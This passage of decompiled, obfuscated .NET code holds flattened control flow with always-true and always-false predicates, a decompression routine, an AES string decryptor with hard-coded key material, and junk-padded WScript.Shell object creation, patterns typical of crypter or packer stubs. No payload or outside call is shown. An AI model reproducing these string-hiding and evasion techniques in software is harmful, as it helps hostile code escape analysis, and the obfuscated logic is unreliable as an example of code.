				case 3:
					class31_0.byte_1 = new byte[class31_0.int_6];
					class31_0.int_2 = 2;
					goto IL_0143;
				case 4:
					class31_0.byte_0 = new byte[19];
					class31_0.int_8 = 0;
					class31_0.int_2 = 3;
					goto IL_018c;
				case 14:
					break;
				default:
					goto IL_01d5;
				case 11:
					goto IL_01e6;
				case 9:
				case 13:
					goto IL_01ed;
				case 12:
					switch (int_)
					{
					case 4:
						goto IL_0058;
					case 5:
						goto IL_0093;
					case 2:
						goto IL_0143;
					case 3:
						goto IL_018c;
					case 0:
						goto IL_0230;
					case 1:
						goto IL_0269;
					}
					goto IL_0000;
				case 6:
					class31_0.int_2 = 1;
					goto IL_0269;
				case 8:
					result = false;
					goto end_IL_0000;
				case 16:
					goto end_IL_0000;
					IL_0230:
					class31_0.int_3 = Class17.smethod_63(class28_0, 5);
					if (class31_0.int_3 >= 0)
					{
						class31_0.int_3 += 257;
						Class17.smethod_167(class28_0, 5);
						goto case 6;
					}
					result = false;
					goto end_IL_0000;
					IL_0269:
					class31_0.int_4 = Class17.smethod_63(class28_0, 5);
					if (class31_0.int_4 >= 0)
					{
						class31_0.int_4++;
						Class17.smethod_167(class28_0, 5);
						goto case 5;
					}
					goto case 8;
					IL_0093:
					int_2 = Class26.Class31.int_1[class31_0.int_7];
					num2 = Class17.smethod_63(class28_0, int_2);
					if (num2 >= 0)
					{
						Class17.smethod_167(class28_0, int_2);
						num2 += Class26.Class31.int_0[class31_0.int_7];
						while (num2-- > 0)
						{
							class31_0.byte_1[class31_0.int_8++] = class31_0.byte_2;
						}
						if (class31_0.int_8 == class31_0.int_6)
						{
							result = true;
							num = 16;
							if (LDM65EyL5AHhD5120V())
							{
								continue;
							}
							goto case 5;
						}
						class31_0.int_2 = 4;
						goto IL_0000;
					}
					result = false;
					goto end_IL_0000;
					IL_0058:
					if (((num3 = Class17.smethod_118(class31_0.class30_0, class28_0)) & -16) == 0)
					{
						class31_0.byte_1[class31_0.int_8++] = (class31_0.byte_2 = (byte)num3);
						goto case 15;
					}
					if (num3 >= 0)
					{
						if (num3 >= 17)
						{
							class31_0.byte_2 = 0;
						}
						class31_0.int_7 = num3 - 16;
						goto case 1;
					}
					result = false;
					goto end_IL_0000;
					IL_0143:
					class31_0.int_5 = Class17.smethod_63(class28_0, 4);
					if (class31_0.int_5 >= 0)
					{
						class31_0.int_5 += 4;
						Class17.smethod_167(class28_0, 4);
						goto case 4;
					}
					result = false;
					goto end_IL_0000;
				}
				break;
			}
			goto IL_01a2;
			IL_018c:
			if (class31_0.int_8 < class31_0.int_5)
			{
				num4 = Class17.smethod_63(class28_0, 3);
				goto IL_01a2;
			}
			goto IL_01d5;
			IL_01a2:
			if (num4 >= 0)
			{
				Class17.smethod_167(class28_0, 3);
				class31_0.byte_0[Class26.Class31.int_9[class31_0.int_8]] = (byte)num4;
				class31_0.int_8++;
				goto IL_018c;
			}
			result = false;
			break;
			IL_01d5:
			class31_0.class30_0 = new Class26.Class30(class31_0.byte_0);
			goto IL_01e6;
			IL_01e6:
			class31_0.byte_0 = null;
			goto IL_01ed;
			IL_01ed:
			class31_0.int_8 = 0;
			class31_0.int_2 = 4;
			num = 2;
			if (oLMEnfKBTsIqRDPCqp())
			{
				goto IL_01a2;
			}
			goto IL_0299;
			continue;
			end_IL_0000:
			break;
		}
		return result;
	}

	static void smethod_185(string string_0, Class40 class40_0, object object_0)
	{
		class40_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_186(Class39 class39_0, Enum1 enum1_0, string string_0, string string_1)
	{
		class39_0.delegate14_0?.Invoke(class39_0, new EventArgs3(enum1_0, string_0, string_1));
	}

	static void smethod_187(Delegate14 delegate14_0, Class48 class48_0)
	{
		Delegate14 @delegate = class48_0.delegate14_0;
		Delegate14 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate14 value = (Delegate14)Delegate.Combine(delegate2, delegate14_0);
			@delegate = Interlocked.CompareExchange(ref class48_0.delegate14_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static string smethod_188(string string_0)
	{
		string password = "nia";
		string s = "cffffffffffffffffff";
		byte[] array = default(byte[]);
		Rfc2898DeriveBytes rfc2898DeriveBytes = default(Rfc2898DeriveBytes);
		byte[] bytes3 = default(byte[]);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] array2 = default(byte[]);
		int count = default(int);
		string result = default(string);
		while (true)
		{
			string text = "SHA1";
			int iterations = 2;
			string s2 = "@1B2c3D4e5F6g7H8";
			int num = 256;
			byte[] bytes = Encoding.ASCII.GetBytes(s2);
			byte[] bytes2 = Encoding.ASCII.GetBytes(s);
			int num2 = 2;
			if (!oLMEnfKBTsIqRDPCqp())
			{
			}
			while (true)
			{
				switch (num2)
				{
				default:
					num2 = 4;
					if (LDM65EyL5AHhD5120V())
					{
						continue;
					}
					goto case 7;
				case 0:
				case 6:
					break;
				case 2:
					array = Convert.FromBase64String(string_0);
					rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, iterations);
					goto case 1;
				case 1:
					bytes3 = rfc2898DeriveBytes.GetBytes(num / 8);
					rijndaelManaged = new RijndaelManaged();
					rijndaelManaged.Mode = CipherMode.CBC;
					goto case 4;
				case 4:
				{
					ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
					MemoryStream memoryStream = new MemoryStream(array);
					cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
					array2 = new byte[checked(array.Length - 1 + 1)];
					count = cryptoStream.Read(array2, 0, array2.Length);
					memoryStream.Close();
					goto case 7;
				}
				case 7:
					cryptoStream.Close();
					goto case 3;
				case 3:
				case 5:
					return Encoding.UTF8.GetString(array2, 0, count);
				case 8:
					return result;
				}
				break;
			}
		}
	}

	static void smethod_189(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class17.smethod_128(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_190(Class26.Class35 class35_0)
	{
		Array.Copy(class35_0.byte_0, 32768, class35_0.byte_0, 0, 32768);
		if (LDM65EyL5AHhD5120V())
		{
			switch (3)
			{
			case 0:
			case 3:
				class35_0.int_1 -= 32768;
				class35_0.int_4 -= 32768;
				class35_0.int_3 -= 32768;
				break;
			case 1:
			case 5:
				break;
			default:
				goto IL_0097;
			case 2:
				goto IL_00b6;
			case 6:
				goto IL_00f0;
			}
		}
		int num = 0;
		goto IL_00b6;
		IL_00f0:
		int i = default(int);
		for (; i < 32768; i++)
		{
			int num2 = class35_0.short_1[i] & 0xFFFF;
			class35_0.short_1[i] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
		}
		return;
		IL_0097:
		int num3 = default(int);
		class35_0.short_0[num] = (short)((num3 >= 32768) ? (num3 - 32768) : 0);
		num++;
		goto IL_00b6;
		IL_00b6:
		if (num < 32768)
		{
			num3 = class35_0.short_0[num] & 0xFFFF;
			goto IL_0097;
		}
		i = 0;
		goto IL_00f0;
	}

	static void smethod_191()
	{
		Process process = new Process();
		process.WaitForExit();
		while (true)
		{
			if (!process.HasExited)
			{
				process.Kill();
			}
			string text = "3232dsd";
			if (oLMEnfKBTsIqRDPCqp())
			{
			}
			switch (3)
			{
			case 0:
			case 2:
				continue;
			case 1:
			case 3:
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WSfcfdfdsfdsfsffffffffffffffccript.Shell", ""));
				goto default;
			}
			default:
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				break;
			}
			case 5:
				break;
			}
			break;
		}
		string text2 = "3232dsd";
	}

	static string smethod_192(Class39.Class43 class43_0)
	{
		return class43_0.string_1;
	}

	static bool smethod_193(bool bool_0, Class26.Class35 class35_0, bool bool_1)
	{
		bool flag = default(bool);
		do
		{
			Class17.smethod_100(class35_0);
			int num;
			if (!bool_1)
			{
				num = 0;
				goto IL_000a;
			}
			if (oLMEnfKBTsIqRDPCqp())
			{
				goto IL_0050;
			}
			switch (2)
			{
			case 0:
			case 2:
				goto IL_0050;
			case 4:
				goto end_IL_0000;
			}
			continue;
			IL_0050:
			num = ((class35_0.int_7 == class35_0.int_8) ? 1 : 0);
			goto IL_000a;
			IL_000a:
			bool bool_2 = (byte)num != 0;
			flag = Class17.smethod_142(bool_0, class35_0, bool_2);
			if (!Class17.smethod_116(class35_0.class36_0))
			{
				break;
			}
			continue;
			end_IL_0000:
			break;
		}
		while (flag);
		return flag;
	}

	static Assembly[] smethod_194(Class40 class40_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class17.smethod_88() };
		}
	}

	static string smethod_195(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int)
			{
				goto IL_0197;
			}
			if (object_0 is long num)
			{
				return num.ToString("x");
			}
			string result = default(string);
			int num3;
			if (object_0 is short num2)
			{
				result = num2.ToString("x");
				num3 = 3;
				if (LDM65EyL5AHhD5120V())
				{
					goto IL_0108;
				}
				goto IL_0156;
			}
			if (object_0 is uint num4)
			{
				return num4.ToString("x");
			}
			ulong num5 = default(ulong);
			if (object_0 is ulong)
			{
				num5 = (ulong)object_0;
				goto IL_0144;
			}
			if (object_0 is ushort num6)
			{
				return num6.ToString("x");
			}
			if (object_0 is byte)
			{
				goto IL_0156;
			}
			if (object_0 is sbyte)
			{
				goto IL_0171;
			}
			long num7 = default(long);
			if (object_0 is IntPtr intPtr)
			{
				num7 = intPtr.ToInt64();
				num3 = 9;
				if (!oLMEnfKBTsIqRDPCqp())
				{
					goto IL_0108;
				}
				goto IL_01b5;
			}
			if (object_0 is UIntPtr)
			{
				goto IL_01b5;
			}
			goto end_IL_0000;
			IL_0144:
			return num5.ToString("x");
			IL_01b5:
			return ((UIntPtr)object_0).ToUInt64().ToString("x");
			IL_0171:
			return ((sbyte)object_0).ToString("x");
			IL_0108:
			switch (num3)
			{
			case 4:
				break;
			case 5:
				goto IL_0156;
			case 8:
				goto IL_0171;
			case 9:
				return num7.ToString("x");
			case 10:
				goto IL_0197;
			case 1:
				goto IL_01b5;
			default:
				return result;
			case 0:
			case 6:
				return result;
			case 2:
			case 3:
				return result;
			case 7:
				return result;
			case 11:
				return result;
			}
			goto IL_0144;
			IL_0156:
			return ((byte)object_0).ToString("x");
			IL_0197:
			return ((int)object_0).ToString("x");
			end_IL_0000:;
		}
		catch
		{
		}
		return string.Empty;
	}

	static bool smethod_196(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		bool result;
		while (true)
		{
			byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
			if (publicKey2 == null != (publicKey == null))
			{
				result = false;
				if (oLMEnfKBTsIqRDPCqp())
				{
				}
				switch (4)
				{
				case 0:
					break;
				default:
					goto IL_0076;
				case 6:
					goto IL_007a;
				case 1:
				case 2:
				case 3:
				case 4:
					goto end_IL_003f;
				}
				continue;
			}
			if (publicKey2 != null)
			{
				for (int num = 0; num < publicKey2.Length; num++)
				{
					if (publicKey2[num] != publicKey[num])
					{
						goto IL_0076;
					}
				}
			}
			goto IL_007a;
			IL_0076:
			result = false;
			break;
			IL_007a:
			result = true;
			break;
			continue;
			end_IL_003f:
			break;
		}
		return result;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_7([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_197(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class17.smethod_128(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	internal static bool LDM65EyL5AHhD5120V()
	{
		return true;
	}

	internal static bool oLMEnfKBTsIqRDPCqp()
	{
		return false;
	}
}
